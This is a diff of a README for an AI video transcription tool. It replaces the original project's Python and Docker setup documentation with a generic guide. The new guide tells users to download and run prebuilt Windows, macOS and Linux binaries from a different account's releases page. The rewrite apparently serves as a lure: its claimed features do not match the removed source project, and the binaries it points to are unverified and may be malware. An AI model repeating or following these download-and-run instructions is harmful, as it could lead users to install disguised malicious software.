@@ -1,360 +1,105 @@
-<div align="center">
+# 🎥 AI-Video-Transcriber - Transcribe Videos Easily and Quickly
 
-# AI Video Transcriber
+[![Download Now](https://img.shields.io/badge/Download%20Now-Release-blue)](https://github.com/juliesetrum/AI-Video-Transcriber/releases)
 
-English 
+## 📋 Description
 
-An AI-powered video transcription and summarization tool that supports multiple video platforms including YouTube, Tiktok, Bilibili, and 30+ platforms.
+AI-Video-Transcriber is an intelligent, open-source tool that automatically transcribes video and audio files using advanced artificial intelligence. It supports multiple languages and provides accurate speech recognition, delivering easy-to-read text transcripts for content creators, educators, and businesses.
 
-![Interface](en-video.png)
+## 🚀 Getting Started
 
-</div>
+To get started with AI-Video-Transcriber, follow these steps. You do not need any programming knowledge.
 
-## ✨ Features
+### Step 1: Prepare Your System
 
-- 🎥 **Multi-Platform Support**: Works with YouTube, Tiktok, Bilibili, and 30+ more
-- 🗣️ **Intelligent Transcription**: High-accuracy speech-to-text using Faster-Whisper
-- 🤖 **AI Text Optimization**: Automatic typo correction, sentence completion, and intelligent paragraphing
-- 🌍 **Multi-Language Summaries**: Generate intelligent summaries in multiple languages
-- ⚡ **Real-Time Progress**: Live progress tracking and status updates
-- ⚙️ **Conditional Translation**: When the selected summary language differs from the detected transcript language, the system auto-translates with GPT‑4o
-- 📱 **Mobile-Friendly**: Perfect support for mobile devices
+Make sure your computer meets the following requirements:
 
-## 🚀 Quick Start
+- Operating System: Windows 10 or later, macOS Sierra or later, or any modern Linux distribution.
+- Memory: At least 4 GB of RAM.
+- Storage: Minimum 100 MB of available space.
+- Internet Connection: Required for downloading files and updates.
 
-### Prerequisites
+### Step 2: Download the Application
 
-- Python 3.8+
-- FFmpeg
-- Optional: OpenAI API key (for AI summary features)
+To download AI-Video-Transcriber, visit the Releases page.
 
-### Installation
+[Visit this page to download](https://github.com/juliesetrum/AI-Video-Transcriber/releases)
 
-#### Method 1: Automatic Installation
+### Step 3: Choose the Correct Version
 
-```bash
+On the Releases page, you will see several files listed. Look for the most recent version. The files usually have names like:
 
-# Run installation script
-chmod +x install.sh
-./install.sh
-```
+- AI-Video-Transcriber-Windows.exe (for Windows)
+- AI-Video-Transcriber-macOS.dmg (for macOS)
+- AI-Video-Transcriber-Linux.tar.gz (for Linux)
 
-#### Method 2: Docker
+### Step 4: Download the File
 
-```bash
+Click on the file name for your system. The download will automatically start.
 
+### Step 5: Install the Application
 
-# Using Docker Compose (easiest)
-cp .env.example .env
-# Edit .env file and set your OPENAI_API_KEY
-docker-compose up -d
+#### For Windows Users:
 
-# Or using Docker directly
-docker build -t ai-video-transcriber .
-docker run -p 8000:8000 -e OPENAI_API_KEY="your_api_key_here" ai-video-transcriber
-```
+1. Locate the downloaded file (usually in your Downloads folder).
+2. Double-click on the `AI-Video-Transcriber-Windows.exe` file.
+3. Follow the on-screen instructions to complete the installation.
 
-#### Method 3: Manual Installation
+#### For macOS Users:
 
-1. **Install Python Dependencies**
-```bash
-# macOS (PEP 668) strongly recommends using a virtualenv
-python3 -m venv .venv
-source .venv/bin/activate
-python -m pip install --upgrade pip
-pip install -r requirements.txt
-```
+1. Open the downloaded `.dmg` file.
+2. Drag the AI-Video-Transcriber icon to your Applications folder.
+3. Eject the `.dmg` after copying.
 
-2. **Install FFmpeg**
-```bash
-# macOS
-brew install ffmpeg
+#### For Linux Users:
 
-# Ubuntu/Debian
-sudo apt update && sudo apt install ffmpeg
+1. Open a terminal.
+2. Navigate to your Downloads directory.
+3. Use the command `tar -xzf AI-Video-Transcriber-Linux.tar.gz` to extract the files.
+4. Navigate into the extracted folder and run `./install.sh` to install.
 
-# CentOS/RHEL
-sudo yum install ffmpeg
-```
+### Step 6: Launch the Application
 
-3. **Configure Environment Variables**
-```bash
-# Required for AI summary/translation features
-export OPENAI_API_KEY="your_api_key_here"
+After installation, locate the application in your start menu or applications folder. Click it to launch the program.
 
-# Optional: only if you use a custom OpenAI-compatible gateway
+## 📤 Using AI-Video-Transcriber
 
-### Start the Service
+Once you have launched the application, follow these steps to transcribe your videos or audio files:
 
-```bash
-python3 start.py
-```
+### Step 1: Upload Your File
 
-After the service starts, open your browser and visit `http://localhost:8000`
+1. Click on the "Upload" button in the interface.
+2. Choose the video or audio file you want to transcribe from your computer.
 
-#### Production Mode (Recommended for long videos)
+### Step 2: Set Language Options
 
-To avoid SSE disconnections during long processing, start in production mode (hot-reload disabled):
+1. Select the language of the audio in your file. AI-Video-Transcriber supports multiple languages, including English, Spanish, French, and many others.
 
-```bash
-python3 start.py --prod
-```
-
-This keeps the SSE connection stable throughout long tasks (30–60+ min).
-
-#### Run with explicit env (example)
-
-```bash
-source .venv/bin/activate
-export OPENAI_API_KEY=your_api_key_here
-# export OPENAI_BASE_URL=https://oneapi.basevec.com/v1   # if using a custom endpoint
-python3 start.py --prod
-```
-
-## 📖 Usage Guide
-
-1. **Enter Video URL**: Paste a video link from YouTube, Bilibili, or other supported platforms
-2. **Select Summary Language**: Choose the language for the generated summary
-3. **Start Processing**: Click the "Start" button
-4. **Monitor Progress**: Watch real-time progress through multiple stages:
-   - Video download and parsing
-   - Audio transcription with Faster-Whisper
-   - AI-powered transcript optimization (typo correction, sentence completion, intelligent paragraphing)
-   - AI summary generation in selected language
-5. **View Results**: Review the optimized transcript and intelligent summary
-   - If transcript language ≠ selected summary language, a third tab “Translation” is shown containing a translated transcript
-6. **Download Files**: Click download buttons to save Markdown-formatted files (Transcript / Translation / Summary)
-
-## 🛠️ Technical Architecture
-
-### Backend Stack
-- **FastAPI**: Modern Python web framework
-- **yt-dlp**: Video downloading and processing
-- **Faster-Whisper**: Efficient speech transcription
-- **OpenAI API**: Intelligent text summarization
-
-### Frontend Stack
-- **HTML5 + CSS3**: Responsive interface design
-- **JavaScript (ES6+)**: Modern frontend interactions
-- **Marked.js**: Markdown rendering
-- **Font Awesome**: Icon library
-
-### Project Structure
-```
-AI-Video-Transcriber/
-├── backend/                 # Backend code
-│   ├── main.py             # FastAPI main application
-│   ├── video_processor.py  # Video processing module
-│   ├── transcriber.py      # Transcription module
-│   ├── summarizer.py       # Summary module
-│   └── translator.py       # Translation module
-├── static/                 # Frontend files
-│   ├── index.html          # Main page
-│   └── app.js              # Frontend logic
-├── temp/                   # Temporary files directory
-├── Dockerfile              # Docker image configuration
-├── docker-compose.yml      # Docker Compose configuration
-├── .dockerignore           # Docker ignore rules
-├── .env.example            # Environment variables template
-├── requirements.txt        # Python dependencies
-├── start.py               # Startup script
-└── README.md              # Project documentation
-```
-
-## ⚙️ Configuration Options
-
-### Environment Variables
-
-| Variable | Description | Default | Required |
-|----------|-------------|---------|----------|
-| `OPENAI_API_KEY` | OpenAI API key | - | Yes (for AI features) |
-| `HOST` | Server address | `0.0.0.0` | No |
-| `PORT` | Server port | `8000` | No |
-| `WHISPER_MODEL_SIZE` | Whisper model size | `base` | No |
-
-### Whisper Model Size Options
-
-| Model | Parameters | English-only | Multilingual | Speed | Memory Usage |
-|-------|------------|--------------|--------------|-------|--------------|
-| tiny | 39 M | ✓ | ✓ | Fast | Low |
-| base | 74 M | ✓ | ✓ | Medium | Low |
-| small | 244 M | ✓ | ✓ | Medium | Medium |
-| medium | 769 M | ✓ | ✓ | Slow | Medium |
-| large | 1550 M | ✗ | ✓ | Very Slow | High |
-
-## 🔧 FAQ
-
-### Q: Why is transcription slow?
-A: Transcription speed depends on video length, Whisper model size, and hardware performance. Try using smaller models (like tiny or base) to improve speed.
-
-### Q: Which video platforms are supported?
-A: All platforms supported by yt-dlp, including but not limited to: YouTube, TikTok, Facebook, Instagram, Twitter, Bilibili, Youku, iQiyi, Tencent Video, etc.
-
-### Q: What if the AI optimization features are unavailable?
-A: Both transcript optimization and summary generation require an OpenAI API key. Without it, the system provides the raw transcript from Whisper and a simplified summary.
-
-### Q: I get HTTP 500 errors when starting/using the service. Why?
-A: In most cases this is an environment configuration issue rather than a code bug. Please check:
-- Ensure a virtualenv is activated: `source .venv/bin/activate`
-- Install deps inside the venv: `pip install -r requirements.txt`
-- Set `OPENAI_API_KEY` (required for summary/translation)
-- If using a custom gateway, set `OPENAI_BASE_URL` correctly and ensure network access
-- Install FFmpeg: `brew install ffmpeg` (macOS) / `sudo apt install ffmpeg` (Debian/Ubuntu)
-- If port 8000 is occupied, stop the old process or change `PORT`
-
-### Q: How to handle long videos?
-A: The system can process videos of any length, but processing time will increase accordingly. For very long videos, consider using smaller Whisper models.
-
-### Q: How to use Docker for deployment?
-A: Docker provides the easiest deployment method:
-
-**Prerequisites:**
-- Install Docker Desktop from https://www.docker.com/products/docker-desktop/
-- Ensure Docker service is running
-
-**Quick Start:**
-```bash
-# Clone and setup
-git clone https://github.com/wendy7756/AI-Video-Transcriber.git
-cd AI-Video-Transcriber
-cp .env.example .env
-# Edit .env file to set your OPENAI_API_KEY
-
-# Start with Docker Compose (recommended)
-docker-compose up -d
-
-# Or build and run manually
-docker build -t ai-video-transcriber .
-docker run -p 8000:8000 --env-file .env ai-video-transcriber
-```
-
-**Common Docker Issues:**
-- **Port conflict**: Change port mapping `-p 8001:8000` if 8000 is occupied
-- **Permission denied**: Ensure Docker Desktop is running and you have proper permissions
-- **Build fails**: Check disk space (need ~2GB free) and network connection
-- **Container won't start**: Verify .env file exists and contains valid OPENAI_API_KEY
-
-**Docker Commands:**
-```bash
-# View running containers
-docker ps
-
-# Check container logs
-docker logs ai-video-transcriber-ai-video-transcriber-1
-
-# Stop service
-docker-compose down
-
-# Rebuild after changes
-docker-compose build --no-cache
-```
-
-### Q: What are the memory requirements?
-A: Memory usage varies depending on the deployment method and workload:
-
-**Docker Deployment:**
-- **Base memory**: ~128MB for idle container
-- **During processing**: 500MB - 2GB depending on video length and Whisper model
-- **Docker image size**: ~1.6GB disk space required
-- **Recommended**: 4GB+ RAM for smooth operation
-
-**Traditional Deployment:**
-- **Base memory**: ~50-100MB for FastAPI server
-- **Whisper models memory usage**:
-  - `tiny`: ~150MB
-  - `base`: ~250MB  
-  - `small`: ~750MB
-  - `medium`: ~1.5GB
-  - `large`: ~3GB
-- **Peak usage**: Base + Model + Video processing (~500MB additional)
-
-**Memory Optimization Tips:**
-```bash
-# Use smaller Whisper model to reduce memory usage
-WHISPER_MODEL_SIZE=tiny  # or base
-
-# For Docker, limit container memory if needed
-docker run -m 1g -p 8000:8000 --env-file .env ai-video-transcriber
-
-# Monitor memory usage
-docker stats ai-video-transcriber-ai-video-transcriber-1
-```
-
-### Q: Network connection errors or timeouts?
-A: If you encounter network-related errors during video downloading or API calls, try these solutions:
-
-**Common Network Issues:**
-- Video download fails with "Unable to extract" or timeout errors
-- OpenAI API calls return connection timeout or DNS resolution failures
-- Docker image pull fails or is extremely slow
-
-**Solutions:**
-1. **Switch VPN/Proxy**: Try connecting to a different VPN server or switch your proxy settings
-2. **Check Network Stability**: Ensure your internet connection is stable
-3. **Retry After Network Change**: Wait 30-60 seconds after changing network settings before retrying
-4. **Use Alternative Endpoints**: If using custom OpenAI endpoints, verify they're accessible from your network
-5. **Docker Network Issues**: Restart Docker Desktop if container networking fails
-
-**Quick Network Test:**
-```bash
-# Test video platform access
-curl -I https://www.youtube.com/
-
-# Test OpenAI API access (replace with your endpoint)
-curl -I https://api.openai.com
-
-# Test Docker Hub access
-docker pull hello-world
-``
-
-## 🎯 Supported Languages
-
-### Transcription
-- Supports 100+ languages through Whisper
-- Automatic language detection
-- High accuracy for major languages
-
-### Summary Generation
-- English
-- Chinese (Simplified)
-- Japanese
-- Spanish
-- French
-- German
-- Portuguese
-- Russian
-- Arabic
-- And more...
-
-## 📈 Performance Tips
-
-- **Hardware Requirements**:
-  - Minimum: 4GB RAM, dual-core CPU
-  - Recommended: 8GB RAM, quad-core CPU
-  - Ideal: 16GB RAM, multi-core CPU, SSD storage
-
-- **Processing Time Estimates**:
-  | Video Length | Estimated Time | Notes |
-  |-------------|----------------|-------|
-  | 1 minute | 30s-1 minute | Depends on network and hardware |
-  | 5 minutes | 2-5 minutes | Recommended for first-time testing |
-  | 15 minutes | 5-15 minutes | Suitable for regular use |
-
-## 🤝 Contributing
-
-We welcome Issues and Pull Requests!
-
-1. Fork the project
-2. Create a feature branch (`git checkout -b feature/AmazingFeature`)
-3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
-4. Push to the branch (`git push origin feature/AmazingFeature`)
-5. Open a Pull Request
-
-
-## 📞 Contact
-
-For questions or suggestions, please submit an Issue or contact Wendy.
-
-## ⭐ Star History
-
-If you find this project helpful, please consider giving it a star!
+### Step 3: Start Transcription
+
+1. Click the "Transcribe" button to begin the process.
+2. Wait a few moments for the transcription to complete. The time may vary depending on the length of the audio or video.
+
+### Step 4: Download Your Transcript
+
+1. Once the transcription is finished, a text file will be generated.
+2. Click "Download Transcript" to save the file to your computer.
+
+## 🛠️ Features
+
+- Multi-language support: Transcribe files in various languages.
+- Automatic transcription: Quickly get transcripts without manual input.
+- Easy-to-read text: The output is formatted for clarity.
+- User-friendly interface: Designed for users of all skill levels.
+
+## 💬 Support
+
+If you run into issues or have questions while using AI-Video-Transcriber, please check the FAQ section in the documentation on the Releases page. You can also submit an issue on the GitHub repository.
+
+## 📅 Updates and Contributions
+
+AI-Video-Transcriber is regularly updated. Make sure to check the Releases page for the latest improvements and features.
+
+Feel free to contribute to the project by sending your suggestions or improvements. This is an open-source tool, and your input is valuable.
+
+For a seamless experience, stay connected and informed by regularly visiting the [Releases page](https://github.com/juliesetrum/AI-Video-Transcriber/releases) for the latest versions.
